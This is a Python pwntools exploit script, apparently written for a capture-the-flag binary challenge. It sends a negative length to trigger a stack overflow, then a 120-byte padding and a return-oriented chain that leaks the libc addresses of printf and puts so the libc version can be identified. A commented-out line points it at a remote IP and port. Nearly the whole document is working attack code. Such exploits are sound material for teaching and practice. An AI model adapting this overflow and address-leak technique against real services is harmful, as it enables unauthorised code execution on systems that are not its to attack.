from pwn import *
import TheNight
#target=remote('54.225.38.91',1027)
target=process('../main')
#context.terminal=["tmux","split","-h"]
#gdb.attach(target)
print(target.recvuntil("length:"))
target.sendline("-1")
print("-1")
print(target.recvuntil("ID:"))
target.sendline("1")
print("1")
print(target.recvuntil("message:"))

payload="A"*120

writeaddr=0x601100
poprdi=0x400a93
poprsir15=0x400a91
puts_plt=0x400700
read_plt=0x400730
printf_got=0x601028
perld=0x400B86
puts_got=0x601018

#puts addr of printf in randomized libc

payload+=p64(poprdi)
payload+=p64(printf_got)
payload+=p64(puts_plt)

#puts addr of puts in randomized libc

payload+=p64(poprdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)

target.sendline(payload)
print(target.recvuntil("Goodbye!\n"))

leak0=target.recvline().strip("\n")
printf_libc=u64(leak0+"\x00"*(8-len(leak0)))
leak1=target.recvline().strip("\n")
puts_libc=u64(leak1+"\x00"*(8-len(leak1)))

print(hex(printf_libc))
print(hex(puts_libc))
TheNight.findLibcVersion("puts",puts_libc,"printf",printf_libc)
target.interactive()
